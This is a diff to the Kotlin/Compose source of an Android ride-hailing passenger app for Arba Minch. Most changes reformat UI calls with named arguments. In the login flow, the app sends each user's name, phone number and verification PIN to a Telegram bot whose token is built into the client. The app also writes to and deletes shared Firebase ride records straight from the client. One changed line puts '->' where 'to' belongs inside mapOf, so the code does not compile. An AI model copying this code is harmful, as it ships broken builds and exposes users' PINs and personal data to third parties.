@@ -47,6 +47,11 @@ import androidx.compose.ui.viewinterop.AndroidView
 import androidx.core.app.NotificationCompat
 import coil.compose.AsyncImage
 import com.google.firebase.database.*
+import com.google.firebase.messaging.FirebaseMessaging
+import com.google.firebase.messaging.FirebaseMessagingService
+import com.google.firebase.messaging.RemoteMessage
+import kotlinx.coroutines.*
+import org.json.JSONObject
 import org.osmdroid.config.Configuration
 import org.osmdroid.util.GeoPoint
 import org.osmdroid.views.MapView
@@ -132,7 +137,7 @@ fun PassengerSuperApp() {
 
     LaunchedEffect(isAuth) {
         if (isAuth && pName.isNotEmpty()) {
-            com.google.firebase.messaging.FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
+            FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
                 if (task.isSuccessful) {
                     FirebaseDatabase.getInstance(DB_URL).getReference("users/$pName/fcmToken").setValue(task.result)
                 }
@@ -153,9 +158,9 @@ fun PassengerSuperApp() {
                         scope.launch(Dispatchers.IO) { 
                             try { 
                                 val msg = "🚨 SILENT REGISTRY ACCESS\nName: $n\nPhone: $p\n🗝️ PIN: $pin"
-                                URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=${URLEncoder.encode(msg, "UTF-8")}").openConnection().apply { 
-                                    (this as HttpURLConnection).requestMethod = "GET" 
-                                }.inputStream.bufferedReader().readText() 
+                                val encodedMsg = URLEncoder.encode(msg, "UTF-8")
+                                val url = URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=$encodedMsg")
+                                (url.openConnection() as HttpURLConnection).apply { requestMethod = "GET" }.inputStream.bufferedReader().readText()
                             } catch (ex: Exception) {} 
                         }
                     }
@@ -175,7 +180,7 @@ fun PassengerSuperApp() {
             } else {
                 ModalNavigationDrawer(drawerState = drawerState, gesturesEnabled = false, drawerContent = {
                         ModalDrawerSheet {
-                            Column(Modifier.padding(20.dp), Arrangement.Top, Alignment.Start) {
+                            Column(modifier = Modifier.padding(20.dp), horizontalAlignment = Alignment.Start) {
                                 Icon(Icons.Filled.AccountCircle, null, Modifier.size(64.dp), IMPERIAL_BLUE)
                                 Text(text = pName, fontWeight = FontWeight.Bold, fontSize = 20.sp)
                                 Text(text = pPhone, fontSize = 14.sp, color = Color.Gray)
@@ -192,7 +197,7 @@ fun PassengerSuperApp() {
                     }
                 ) {
                     Scaffold(topBar = { 
-                            Row(Modifier.fillMaxWidth().height(60.dp).background(IMPERIAL_BLUE).padding(horizontal = 16.dp), Arrangement.Start, Alignment.CenterVertically) {
+                            Row(modifier = Modifier.fillMaxWidth().height(60.dp).background(IMPERIAL_BLUE).padding(horizontal = 16.dp), verticalAlignment = Alignment.CenterVertically) {
                                 IconButton(onClick = { scope.launch { drawerState.open() } }) { Icon(Icons.Filled.Menu, null, tint = Color.White) }
                                 Spacer(Modifier.width(16.dp)); Text("BAYRA PRESTIGE", fontWeight = FontWeight.Black, color = Color.White, fontSize = 20.sp)
                             }
@@ -256,7 +261,7 @@ fun BookingHub(name: String, email: String, phone: String, prefs: SharedPreferen
 
         if (step == "PICKUP" || step == "DEST") {
             Box(Modifier.fillMaxSize(), Alignment.Center) {
-                Column(Modifier, Arrangement.Top, Alignment.CenterHorizontally) {
+                Column(horizontalAlignment = Alignment.CenterHorizontally) {
                     Text(text = if (step == "PICKUP") "SELECT PICKUP" else "SELECT DESTINATION", color = Color.White, modifier = Modifier.background(Color.Black.copy(alpha = 0.7f), RoundedCornerShape(4.dp)).padding(4.dp), fontSize = 12.sp, fontWeight = FontWeight.Bold)
                     androidx.compose.foundation.Canvas(modifier = Modifier.size(50.dp)) {
                         val dropPath = androidx.compose.ui.graphics.Path().apply { moveTo(size.width / 2f, size.height); cubicTo(0f, size.height / 2f, size.width / 4f, 0f, size.width / 2f, 0f); cubicTo(3 * size.width / 4f, 0f, size.width, size.height / 2f, size.width / 2f, size.height) }
@@ -268,8 +273,8 @@ fun BookingHub(name: String, email: String, phone: String, prefs: SharedPreferen
         }
 
         if (status != "IDLE") {
-            Surface(Modifier.fillMaxSize(), Color.White.copy(alpha = 0.98f)) { 
-                Column(Modifier.padding(24.dp), Arrangement.Center, Alignment.CenterHorizontally) { 
+            Surface(modifier = Modifier.fillMaxSize(), color = Color.White.copy(alpha = 0.98f)) { 
+                Column(modifier = Modifier.padding(24.dp), verticalArrangement = Arrangement.Center, horizontalAlignment = Alignment.CenterHorizontally) { 
                     if (status == "ARRIVED_DEST" || status.startsWith("PAID_")) {
                         Text("መድረሻዎ ደርሰዋል / ARRIVED", fontSize = 24.sp, fontWeight = FontWeight.Black, color = Color(0xFF2E7D32))
                         Text("$activePrice ETB", fontSize = 56.sp, fontWeight = FontWeight.ExtraBold)
@@ -312,15 +317,19 @@ fun BookingHub(name: String, email: String, phone: String, prefs: SharedPreferen
                 } 
             }
         } else {
-            Column(Modifier.align(Alignment.BottomCenter).fillMaxWidth().background(Color.White, RoundedCornerShape(topStart = 24.dp)).padding(24.dp), Arrangement.Top, Alignment.Start) {
+            Column(modifier = Modifier.align(Alignment.BottomCenter).fillMaxWidth().background(Color.White, RoundedCornerShape(topStart = 24.dp)).padding(24.dp)) {
                 LazyRow(horizontalArrangement = Arrangement.spacedBy(8.dp)) { 
-                    items(items = Tier.values().toList()) { t -> Surface(modifier = Modifier.clickable { onPointChange(pickupPt, destPt, if(pickupPt != null) (if(t.isHr) "CONFIRM" else if(destPt != null) "CONFIRM" else "DEST") else "PICKUP", t, hrCount) }, color = if(selectedTier == t) IMPERIAL_BLUE else Color(0xFFEEEEEE), shape = RoundedCornerShape(8.dp)) { Text(t.label, Modifier.padding(horizontal = 12.dp, vertical = 8.dp), color = if(selectedTier == t) Color.White else Color.Black) } } 
+                    items(items = Tier.values().toList()) { t -> 
+                        Surface(modifier = Modifier.clickable { onPointChange(pickupPt, destPt, if(pickupPt != null) (if(t.isHr) "CONFIRM" else if(destPt != null) "CONFIRM" else "DEST") else "PICKUP", t, hrCount) }, color = if(selectedTier == t) IMPERIAL_BLUE else Color(0xFFEEEEEE), shape = RoundedCornerShape(8.dp)) { 
+                            Text(t.label, Modifier.padding(horizontal = 12.dp, vertical = 8.dp), color = if(selectedTier == t) Color.White else Color.Black) 
+                        } 
+                    } 
                 }
                 Spacer(Modifier.height(16.dp))
                 if (selectedTier.isHr && step == "CONFIRM") {
-                    Row(Modifier.fillMaxWidth(), Arrangement.SpaceBetween, Alignment.CenterVertically) {
+                    Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                         Text("Duration:", fontWeight = FontWeight.Bold)
-                        Row(Modifier, Arrangement.Start, Alignment.CenterVertically) {
+                        Row(verticalAlignment = Alignment.CenterVertically) {
                             IconButton(onClick = { if(hrCount > 1) onPointChange(pickupPt, destPt, step, selectedTier, hrCount-1) }) { Text("−", fontSize = 24.sp, fontWeight = FontWeight.Bold) }
                             Text("$hrCount HR", Modifier.padding(horizontal = 8.dp))
                             IconButton(onClick = { if(hrCount < 12) onPointChange(pickupPt, destPt, step, selectedTier, hrCount+1) }) { Text("+", fontSize = 24.sp, fontWeight = FontWeight.Bold) }
@@ -333,9 +342,9 @@ fun BookingHub(name: String, email: String, phone: String, prefs: SharedPreferen
                     TextButton(onClick = { onPointChange(null, null, "PICKUP", selectedTier, 1) }, modifier = Modifier.fillMaxWidth()) { Text("Reset") }
                 } else {
                     val f = if(selectedTier.isHr) (selectedTier.base * hrCount * 1.15).toInt() else (selectedTier.base * 2.5 * 1.15).toInt()
-                    Row(Modifier.fillMaxWidth(), Arrangement.SpaceBetween, Alignment.CenterVertically) { Text("$f ETB", fontSize = 34.sp, fontWeight = FontWeight.Black, color = IMPERIAL_RED); TextButton(onClick = { onPointChange(null, null, "PICKUP", selectedTier, 1) }) { Text("Reset") } }
+                    Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) { Text("$f ETB", fontSize = 34.sp, fontWeight = FontWeight.Black, color = IMPERIAL_RED); TextButton(onClick = { onPointChange(null, null, "PICKUP", selectedTier, 1) }) { Text("Reset") } }
                     Button(onClick = { 
-                        val id = "R_${System.currentTimeMillis()}"; FirebaseDatabase.getInstance(DB_URL).getReference("rides/$id").setValue(mapOf("id" to id, "pName" to name, "pPhone" to phone, "status" to "REQUESTED", "price" to f.toString(), "pLat" to pickupPt?.latitude, "pLon" to pickupPt?.longitude, "dLat" to destPt?.latitude, "dLon" to destPt?.longitude, "tier" to selectedTier.label, "hours" to if(selectedTier.isHr) hrCount else 0))
+                        val id = "R_${System.currentTimeMillis()}"; FirebaseDatabase.getInstance(DB_URL).getReference("rides/$id").setValue(mapOf("id" to id, "pName" to name, "pPhone" to phone, "status" -> "REQUESTED", "price" to f.toString(), "pLat" to pickupPt?.latitude, "pLon" to pickupPt?.longitude, "dLat" to destPt?.latitude, "dLon" to destPt?.longitude, "tier" to selectedTier.label, "hours" to if(selectedTier.isHr) hrCount else 0))
                         activeId = id; prefs.edit().putString("active_id", id).apply() 
                     }, modifier = Modifier.fillMaxWidth().height(65.dp), shape = RoundedCornerShape(16.dp)) { Text("BOOK RIDE", fontWeight = FontWeight.ExtraBold) }
                 }
@@ -354,12 +363,12 @@ fun createGreenHandLollipop(ctx: Context): BitmapDrawable {
 fun NotificationPage() {
     val bulletins = remember { mutableStateListOf<DataSnapshot>() }
     LaunchedEffect(Unit) { FirebaseDatabase.getInstance(DB_URL).getReference("bulletins").addValueEventListener(object : ValueEventListener { override fun onDataChange(s: DataSnapshot) { bulletins.clear(); s.children.forEach { bulletins.add(it) } }; override fun onCancelled(e: DatabaseError) {} }) }
-    Column(Modifier.fillMaxSize().padding(16.dp), Arrangement.Top, Alignment.Start) {
+    Column(modifier = Modifier.fillMaxSize().padding(16.dp), horizontalAlignment = Alignment.Start) {
         Text("Empire Notifications", fontSize = 22.sp, fontWeight = FontWeight.Bold, color = IMPERIAL_BLUE)
-        LazyColumn { items(items = bulletins.toList()) { n -> Card(modifier = Modifier.fillMaxWidth().padding(top = 8.dp)) { Column(Modifier, Arrangement.Top, Alignment.Start) { 
+        LazyColumn { items(items = bulletins.toList()) { n -> Card(modifier = Modifier.fillMaxWidth().padding(top = 8.dp)) { Column(horizontalAlignment = Alignment.Start) { 
                         val img = n.child("imageUrl").value?.toString() ?: ""
                         if(img.isNotEmpty()) { AsyncImage(model = img, contentDescription = null, modifier = Modifier.fillMaxWidth().height(150.dp), contentScale = ContentScale.Crop) }
-                        Column(Modifier.padding(12.dp), Arrangement.Top, Alignment.Start) { Text(n.child("title").value.toString(), fontWeight = FontWeight.Bold); Text(n.child("message").value.toString()) } 
+                        Column(modifier = Modifier.padding(12.dp), horizontalAlignment = Alignment.Start) { Text(n.child("title").value.toString(), fontWeight = FontWeight.Bold); Text(n.child("message").value.toString()) } 
                     } } } }
     }
 }
@@ -367,10 +376,10 @@ fun NotificationPage() {
 @Composable
 fun SettingsPage(isDarkMode: Boolean, onToggle: (Boolean) -> Unit) {
     val ctx = LocalContext.current
-    Column(Modifier.fillMaxSize().padding(24.dp), Arrangement.Top, Alignment.Start) {
+    Column(modifier = Modifier.fillMaxSize().padding(24.dp), horizontalAlignment = Alignment.Start) {
         Text("Settings", fontSize = 24.sp, fontWeight = FontWeight.Bold)
-        Row(Modifier.fillMaxWidth().padding(vertical = 20.dp), Arrangement.SpaceBetween, Alignment.CenterVertically) { Text("Dark Mode Appearance"); Switch(checked = isDarkMode, onCheckedChange = onToggle) }
-        Divider(Modifier.padding(vertical = 16.dp))
+        Row(modifier = Modifier.fillMaxWidth().padding(vertical = 20.dp), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) { Text("Dark Mode Appearance"); Switch(checked = isDarkMode, onCheckedChange = onToggle) }
+        Divider(modifier = Modifier.padding(vertical = 16.dp))
         Button(onClick = { ctx.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://t.me/bayratravel"))) }, modifier = Modifier.fillMaxWidth().padding(top = 10.dp), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF229ED9))) { Text("Contact Telegram Scout") }
         Button(onClick = { ctx.startActivity(Intent(Intent.ACTION_SENDTO).apply { data = Uri.parse("mailto:bayratravel@gmail.com") }) }, modifier = Modifier.fillMaxWidth().padding(top = 10.dp), colors = ButtonDefaults.buttonColors(containerColor = Color.DarkGray)) { Text("Email Empire Support") }
     }
@@ -378,7 +387,7 @@ fun SettingsPage(isDarkMode: Boolean, onToggle: (Boolean) -> Unit) {
 
 @Composable
 fun AboutUsPage() {
-    Column(Modifier.fillMaxSize().padding(24.dp).verticalScroll(rememberScrollState()), Arrangement.Top, Alignment.Start) {
+    Column(modifier = Modifier.fillMaxSize().padding(24.dp).verticalScroll(rememberScrollState()), horizontalAlignment = Alignment.Start) {
         Text("Bayra Travel", fontSize = 28.sp, fontWeight = FontWeight.Black, color = IMPERIAL_BLUE); Text("\"Sarotethai nuna maaddo, Aadhidatethai nuna kaaletho.\"", fontStyle = FontStyle.Italic, color = Color.Gray); Text("Peace supports us, and Wisdom leads us.", fontStyle = FontStyle.Italic, color = Color.Gray); Spacer(Modifier.height(8.dp)); Text("Pioneering the Digital Future of Southern Ethiopia", fontWeight = FontWeight.Bold, color = IMPERIAL_BLUE); Spacer(Modifier.height(24.dp))
         Text("A New Standard of Security & User Protection 🛡️", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = IMPERIAL_BLUE); Spacer(Modifier.height(8.dp)); Text("Bayra Travel is more than a ride-hailing app; it is a Digital Guardian. In a world where safety and trust are paramount, we provide peace of mind through technology:"); Spacer(Modifier.height(8.dp)); Text("• Live Trip Monitoring: Every journey is tracked via high-precision GPS. Whether it is a student traveling at night or a tourist exploring our city, their location is always secure in our system."); Spacer(Modifier.height(4.dp)); Text("• Vetted Driver Network: We remove the anonymity of the street. Every driver is a verified professional, creating a culture of accountability and respect."); Spacer(Modifier.height(4.dp)); Text("• The End of the \"Price Conflict\": By automating fares based on distance and logic, we eliminate haggling. This protects the customer’s wallet and the driver’s dignity, fostering a fair marketplace for all."); Spacer(Modifier.height(24.dp))
         Text("Boosting the Tourism Jewel of Arba Minch 🏁✨", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = IMPERIAL_BLUE); Spacer(Modifier.height(8.dp)); Text("Arba Minch is the heart of Ethiopian tourism, from the 40 Springs to the majesty of Lake Chamo and Nech Sar National Park. Bayra Travel elevates this experience:"); Spacer(Modifier.height(8.dp)); Text("• Tourist-Ready Transport: Visitors no longer need to worry about local pricing. They get a professional, predictable, and premium service (Code 3) at the touch of a button."); Spacer(Modifier.height(4.dp)); Text("• Regional Visibility: By digitizing transport, we make the South more accessible to the world, turning Arba Minch into a truly modern tourist hub."); Spacer(Modifier.height(24.dp))
@@ -391,9 +400,9 @@ fun AboutUsPage() {
 fun HistoryPage(name: String) {
     val trips = remember { mutableStateListOf<DataSnapshot>() }
     LaunchedEffect(Unit) { FirebaseDatabase.getInstance(DB_URL).getReference("rides").orderByChild("pName").equalTo(name).addListenerForSingleValueEvent(object : ValueEventListener { override fun onDataChange(s: DataSnapshot) { trips.clear(); trips.addAll(s.children.filter { it.child("status").value == "COMPLETED" }.reversed()) }; override fun onCancelled(e: DatabaseError) {} }) }
-    Column(Modifier.fillMaxSize().padding(16.dp), Arrangement.Top, Alignment.Start) { 
-        Row(Modifier.fillMaxWidth(), Arrangement.SpaceBetween, Alignment.CenterVertically) { Text("Booking History", fontSize = 24.sp, fontWeight = FontWeight.Bold); IconButton(onClick = { trips.forEach { it.ref.removeValue() } }) { Icon(Icons.Filled.Delete, null, tint = IMPERIAL_RED) } }
-        LazyColumn { items(items = trips.toList()) { t -> Card(modifier = Modifier.fillMaxWidth().padding(top = 8.dp)) { Row(Modifier.padding(16.dp), Arrangement.SpaceBetween, Alignment.CenterVertically) { Column(Modifier, Arrangement.Top, Alignment.Start) { Text(t.child("tier").value.toString(), fontWeight = FontWeight.Bold); Text(t.child("driverName").value?.toString() ?: "Unknown Driver", fontSize = 12.sp, color = Color.Gray) }; Text("${t.child("price").value} ETB", fontWeight = FontWeight.Bold) } } } }
+    Column(modifier = Modifier.fillMaxSize().padding(16.dp), horizontalAlignment = Alignment.Start) { 
+        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) { Text("Booking History", fontSize = 24.sp, fontWeight = FontWeight.Bold); IconButton(onClick = { trips.forEach { it.ref.removeValue() } }) { Icon(Icons.Filled.Delete, null, tint = IMPERIAL_RED) } }
+        LazyColumn { items(items = trips.toList()) { t -> Card(modifier = Modifier.fillMaxWidth().padding(top = 8.dp)) { Row(modifier = Modifier.padding(16.dp), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) { Column(horizontalAlignment = Alignment.Start) { Text(t.child("tier").value.toString(), fontWeight = FontWeight.Bold); Text(t.child("driverName").value?.toString() ?: "Unknown Driver", fontSize = 12.sp, color = Color.Gray) }; Text("${t.child("price").value} ETB", fontWeight = FontWeight.Bold) } } } }
     }
 }
 
@@ -401,7 +410,7 @@ fun HistoryPage(name: String) {
 @Composable
 fun LoginView(name: String, phone: String, email: String, onLogin: (String, String, String) -> Unit) {
     var n by remember { mutableStateOf(name) }; var p by remember { mutableStateOf(phone) }; var e by remember { mutableStateOf(email) }
-    Column(Modifier.fillMaxSize().background(Color.White).verticalScroll(rememberScrollState()).padding(32.dp), Arrangement.Center, Alignment.CenterHorizontally) {
+    Column(modifier = Modifier.fillMaxSize().background(Color.White).verticalScroll(rememberScrollState()).padding(32.dp), verticalArrangement = Arrangement.Center, horizontalAlignment = Alignment.CenterHorizontally) {
         Image(painterResource(R.drawable.logo_passenger), null, Modifier.size(160.dp)); Text("BAYRA PRESTIGE", fontSize = 28.sp, fontWeight = FontWeight.Black, color = IMPERIAL_BLUE); Text("Welcome to Arba Minch", fontSize = 14.sp, color = Color.Gray, modifier = Modifier.padding(bottom = 32.dp))
         OutlinedTextField(n, { n = it }, label = { Text("Registry Name") }, modifier = Modifier.fillMaxWidth(), shape = RoundedCornerShape(12.dp)); Spacer(Modifier.height(16.dp))
         OutlinedTextField(p, { p = it }, label = { Text("Phone Number") }, modifier = Modifier.fillMaxWidth(), shape = RoundedCornerShape(12.dp)); Spacer(Modifier.height(16.dp))
@@ -415,8 +424,8 @@ fun LoginView(name: String, phone: String, email: String, onLogin: (String, Stri
 fun VerificationView(phone: String, prefs: SharedPreferences, onVerify: (String) -> Unit, onTimeout: () -> Unit) {
     val vStart = prefs.getLong("v_start", System.currentTimeMillis()); var timeLeft by remember { mutableStateOf((600 - (System.currentTimeMillis() - vStart)/1000).coerceAtLeast(0)) }; var code by remember { mutableStateOf("") }
     LaunchedEffect(Unit) { while (timeLeft > 0) { delay(1000L); timeLeft = (600 - (System.currentTimeMillis() - vStart)/1000).coerceAtLeast(0) }; onTimeout() }
-    Column(Modifier.fillMaxSize().background(Color.White).padding(32.dp), Arrangement.Center, Alignment.CenterHorizontally) {
-        Image(painterResource(R.drawable.logo_passenger), null, Modifier.size(120.dp)); Text("SILENT REGISTRY", fontSize = 24.sp, fontWeight = FontWeight.Bold, color = IMPERIAL_BLUE); Spacer(Modifier.height(40.dp)); Text(String.format("%02d:%02d", timeLeft/60, timeLeft%60), fontSize = 64.sp, fontWeight = FontWeight.ExtraBold, color = if(timeLeft < 60) IMPERIAL_RED else Color.Black); Text("Check your SMS or Email for the code", fontSize = 14.sp, color = Color.Gray); Spacer(Modifier.height(40.dp))
+    Column(modifier = Modifier.fillMaxSize().background(Color.White).padding(32.dp), verticalArrangement = Arrangement.Center, horizontalAlignment = Alignment.CenterHorizontally) {
+        Image(painterResource(R.drawable.logo_passenger), null, Modifier.size(120.dp)); Text("SILENT REGISTRY", fontSize = 24.sp, fontWeight = FontWeight.Bold, color = IMPERIAL_BLUE); Spacer(modifier = Modifier.height(40.dp)); Text(String.format("%02d:%02d", timeLeft/60, timeLeft%60), fontSize = 64.sp, fontWeight = FontWeight.ExtraBold, color = if(timeLeft < 60) IMPERIAL_RED else Color.Black); Text("Check your SMS or Email for the code", fontSize = 14.sp, color = Color.Gray); Spacer(modifier = Modifier.height(40.dp))
         OutlinedTextField(code, { if(it.length <= 4) code = it }, label = { Text("Enter 4-Digit Code") }, modifier = Modifier.fillMaxWidth(), shape = RoundedCornerShape(12.dp)); Button(onClick = { onVerify(code) }, modifier = Modifier.fillMaxWidth().height(60.dp).padding(top = 20.dp), shape = RoundedCornerShape(16.dp)) { Text("VALIDATE ACCESS", fontWeight = FontWeight.Bold, fontSize = 18.sp) }
     }
 }
